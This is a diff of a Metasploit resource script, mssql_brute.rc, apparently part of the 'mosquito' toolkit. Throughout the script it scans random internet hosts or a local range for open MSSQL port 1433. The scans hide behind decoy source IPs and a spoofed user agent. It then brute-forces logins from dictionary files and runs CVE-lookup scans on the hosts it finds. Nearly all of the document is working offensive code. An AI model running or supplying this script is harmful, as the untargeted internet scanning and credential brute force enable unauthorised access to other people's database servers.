@@ -1,33 +1,37 @@
-   <ruby>
-      run_single("workspace -a redteam")
+##
+# Script: mssql_brute.rc
+# Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+# GitHub: https://github.com/r00t-3xp10it/resource_files
+# -
+# [OPTIONS]
+# setg SAVE_DB true - Save workspace mosquito to database.xml
+# setg LIMMIT 1000 - Limit the number of random rhosts to search
+# setg USER_FILE /root/users.txt - To instruct auxiliarys to use our own dicionary file
+# setg PASS_FILE /root/passwods.txt - To instruct auxiliarys to use our own dicionary file
+# setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 1433 open
+# setg RHOSTS 185.99.212.190 180.86.155.12 - To instruct db_nmap to check targets for port 1433 open
+# -
+# [SYNTAX EXAMPLES]
+# msf5 > setg RANDOM_HOSTS true;resource /root/mssql_brute.rc'
+# msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/mssql_brute.rc'
+##
+  <ruby>
+      run_single("workspace -a mosquito")
       help = %Q|
+                                                🦟__________       
+              _______🦟________________________  ___(_) _  /______🦟
+           __  __  __ \\  __ \\_  ___/  __  /  / / /_  /_  __/  __ \\
+         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           /_/ /_/ /_/\\____//____/ \\__, / \\__,_/ /_/  \\__/ \\____/
+                                  🦟 /_/                       🦟
 
-        Description:
-          setg SAVE_DB true - Save workspace redteam to database.xml
-          setg LIMMIT 1000 - Limit the number of random rhosts to search
-          setg USER_FILE /root/users.txt - To instruct auxiliarys to use our own dicionary file
-          setg PASS_FILE /root/passwods.txt - To instruct auxiliarys to use our own dicionary file
-          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 1433 open
-          setg RHOSTS 185.99.212.190 180.86.155.12 - To instruct db_nmap to check targets for port 1433 open
-          mssql_brute will use nmap to search/check for port 1433 open, then it populates the msfdb with a
-          list of hosts found, and run auxiliary modules to gather info and brute force mssql services.
-          if none value (setg) has povided then this resource script will use is own default values.
+    Script: mssql_brute.rc
+    Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+    GitHub: https://github.com/r00t-3xp10it/resource_files
 
-        Execute in msfconsole:
-          setg SAVE_DB <true-or-blank>
-          setg LIMMIT <number-of-rhosts>
-          setg RANDOM_HOSTS <true-or-blank>
-          setg RHOSTS <hosts-separated-by-spaces>
-          setg USER_FILE <absoluct-path-of-dicionary.txt>
-          setg PASS_FILE <absoluct-path-of-dicionary.txt>
-          resource <path-to-script>/mssql_brute.rc
-
-        Author:
-          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
       |
       print_line(help)
       Rex::sleep(2.0)
-      print_line("")
 
 
       ## Make sure we are connected to db
@@ -37,22 +41,26 @@
         run_single("exit")
         return nil
       else
-        print_good("Database connected to postgresql.")
         local = Dir.pwd
+        print_good("Database connected to postgresql.")
+        Rex::sleep(0.5)
+        work_name = framework.db.workspace.name
+        print_status("Working in workspace: *#{work_name}")
         Rex::sleep(1.0)
+        ip_range = File.read("ip_range.txt") if File.exist?("ip_range.txt")
       end
 
       ## Sellect the type of nmap scan to use.
       if (framework.datastore['RANDOM_HOSTS'] == "true")
          if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
            run_single("setg LIMMIT 1000")
-           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -p T:1433 --open -iR #{framework.datastore['LIMMIT']} --script=ms-sql-info.nse")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
          else
            print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
-           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -p T:1433 --open -iR #{framework.datastore['LIMMIT']} --script=ms-sql-info.nse")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
          end
       elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
-         run_single("setg RHOSTS 192.168.1.0/24")
+         run_single("setg RHOSTS #{ip_range}.0/24")
       elsif (framework.datastore['RHOSTS'])
          print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
       end
@@ -68,15 +76,19 @@
       end
 
       ## db_nmap WAN or RHOSTS scan settings
-      unless (framework.datastore['RANDOM_HOSTS'] == "true")
-         run_single("db_nmap -sV -Pn -T4 -O -p T:1433 --open --script=ms-sql-info.nse #{framework.datastore['RHOSTS']}")
+      if (framework.datastore['RHOSTS'] == "#{ip_range}.0/24")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 1433 --open --script=banner.nse,ms-sql-info.nse,ms-sql-empty-password.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+      elsif (framework.datastore['RANDOM_HOSTS'] == "true")
+         print_status("Nmap: search for random remote hosts with ports 1433 open")
+         run_single("db_nmap -sS -vvv -Pn -T4 -iR #{framework.datastore['LIMMIT']} -p 1433 --open --script=banner.nse,ms-sql-info.nse,ms-sql-empty-password.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
       else
-         print_warning("db_nmap: search for random remote targets with port 1433 open (mssql)")
-         run_single("db_nmap -sV -Pn -T4 -O -p T:1433 --open -iR #{framework.datastore['LIMMIT']} --script=ms-sql-info.nse")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 1433 --open --script=banner.nse,ms-sql-info.nse,ms-sql-empty-password.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
       end
 
-      ## Read the database 
-      run_single("spool #{local}/logs/mssql_brute.log")
+      ## Read the database
+      if File.directory?("#{local}/logs")
+         run_single("spool #{local}/logs/mssql_brute.log")
+      end
       print_line("")
       run_single("services")
       print_good("Sellecting target hosts from msf database.")
@@ -86,21 +98,19 @@
       xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
 
       ## Make sure that exists hosts/ports (open) in database
-      if xhost.nil? or xhost == ''
+      if xhost.nil? or xhost == '' or xhost == ' '
            print_error("db_nmap scan did not find any alive connections.")
            print_error("Please wait, cleaning recent configurations.")
            Rex::sleep(1.0)
            run_single("unsetg all")
-           File.delete('#{local}/logs/mssql_brute.log')
-           run_single("workspace -d redteam")
+           run_single("workspace -d mosquito")
            return nil
-      elsif xport.nil? or xport == ''
+      elsif xport.nil? or xport == '' or xport == ' '
            print_error("db_nmap did not find any 1433 open ports.")
            print_error("Please wait, cleaning recent configurations.")
            Rex::sleep(1.0)
            run_single("unsetg all")
-           File.delete('#{local}/logs/mssql_brute.log')
-           run_single("workspace -d redteam")
+           run_single("workspace -d mosquito")
            return nil
       end
 
@@ -114,8 +124,7 @@
            print_error("Please wait, cleaning recent configurations.")
            Rex::sleep(1.0)
            run_single("unsetg all")
-           File.delete('#{local}/logs/mssql_brute.log')
-           run_single("workspace -d redteam")
+           run_single("workspace -d mosquito")
            return nil
       end
 
@@ -129,36 +138,90 @@
            print_error("Please wait, cleaning recent configurations.")
            Rex::sleep(1.0)
            run_single("unsetg all")
-           File.delete('#{local}/logs/mssql_brute.log')
-           run_single("workspace -d redteam")
+           run_single("workspace -d mosquito")
            return nil
+      end
+
+      ## Make sure that freevulnseach.nse exists
+      Rex::sleep(2.0)
+      unless (File.exist?(nse))
+           print_error("[ERROR] freevulnsearch.nse/vulners.nse script(s) not found in nmap db.")
+           print_error("[ERROR] Download nse script(s) and install it before running this rc file.")
+           Rex::sleep(1.0)
+           nof = %Q|
+
+    How To Fix
+    ----------
+    Exit current session and msfconsole < exit AND exit -y >
+    Then execute the follow commands in a new terminal windows:
+
+    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
+    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
+    sudo nmap --script-updatedb
+
+    sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
+    sudo cp vulners.nse /usr/share/nmap/scripts/vulners.nse
+    sudo nmap --script-updatedb
+
+           |
+           print_line(nof)
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           run_single("unsetg all")
+           run_single("workspace -d mosquito")
+           return nil
+      else
+           print_good("freevulnsearch.nse/vulners.nse script(s) found.")
       end
 
       ## brute force / gather information function
       print_status("Operative systems: #{xname}")
       run_single("setg RHOSTS #{xhost}")
       Rex::sleep(2.0)
-      if xport =~ /1433/i or proto =~ /ms-sql-s/i or proto =~ /mssql/i or proto =~ /mssql-m/i
+      if xport =~ /1433/ or proto =~ /(ms-sql-s|mssql|mssql-m)/i
            print_warning("Remote Target port 1433 mssql found")
            Rex::sleep(1.0)
            run_single("use auxiliary/scanner/mssql/mssql_ping")
            run_single("set THREADS 16")
            print_line("")
-           run_single("services -c name -S mssql -R")
+           run_single("services -c port -S 1433 -R")
            run_single("exploit")
            run_single("use auxiliary/scanner/mssql/mssql_login")
-              run_single("set PASS_FILE #{framework.datastore['PASS_FILE']}")
-              run_single("set USER_FILE #{framework.datastore['USER_FILE']}")
+           run_single("set PASS_FILE #{framework.datastore['PASS_FILE']}")
+           run_single("set USER_FILE #{framework.datastore['USER_FILE']}")
            print_line("")
-           run_single("services -c name -S mssql -R")
+           run_single("services -c port -S 1433 -R")
            run_single("exploit")
       end
+
+         ## Running freevulnsearch.nse (scan for CVE's)
+         print "[+] Scan for possible CVE's? (y/n): "
+            question = gets.chomp
+
+         if question == "y" or question == "Y"
+            displ = %Q|
+
+         MMMMMMMMMMM'""""'YMMM  MM""MMMMM""MM  MM""""""""`MMMMMMMMMM
+         MMMMMMMMMM' .mmm. `MM  MM  MMMMM  MM  MM  mmmmmmmMMMMMMMMMM
+         MMMMMMMMMM  MMMMMooMM  MM  MMMMP  MM  MM`      MMMMMMMMMMMM 
+         MMMMMMMMMM  MMMMMMMMM  MM  MMMM' .MM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMM. `MMM' .MM  MM  MMP' .MMM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMMM.     .dMM  MM     .dMMMM  MM        .MMMMMMd@bM 
+         MMMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMMM
+                    freevulnsearch.nse by: Mathias Gut
+                         vulners.nse by: gmedian
+
+            |
+            print_line(displ)
+            print_warning("Running CVE checks againts: #{framework.datastore['RHOSTS']}")
+            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse,vulners.nse #{framework.datastore['RHOSTS']}")
+         end
 
       ## Save current database to local file (database.xml)
       if (framework.datastore['SAVE_DB'] == "true")
          rand = Rex::Text.rand_text_alpha(5)
-         print_warning("Exporting database to: #{local}/database_#{rand}.xml")
-         run_single("db_export -f xml -a database_#{rand}.xml")
+         print_warning("Exporting database to: #{local}/logs/database_#{rand}.xml")
+         run_single("db_export -f xml -a #{local}/logs/database_#{rand}.xml")
       end
 
       ## Cleaning database and unset global variables
@@ -166,10 +229,15 @@
       Rex::sleep(1.5)
       run_single("unsetg all")
       run_single("unset all")
-      run_single("workspace -d redteam")
-      run_single("back")
+      run_single("workspace -d mosquito")
 
-print_warning("Logfile stored under: #{local}/logs/mssql_brute.log")
-print_warning("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
+      dtr = `date`
+      ## Writting ['xhost(s)'] to mosquito logfile
+      if File.directory?("#{local}/logs")
+         print_warning("Logfile stored under: #{local}/logs/mssql_brute.log")
+         run_single("echo \"[#{dtr}] mssql_brute: #{xhost}\" >> logs/mosquito.log")
+      end
+      File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+   run_single("back")
 </ruby>
 
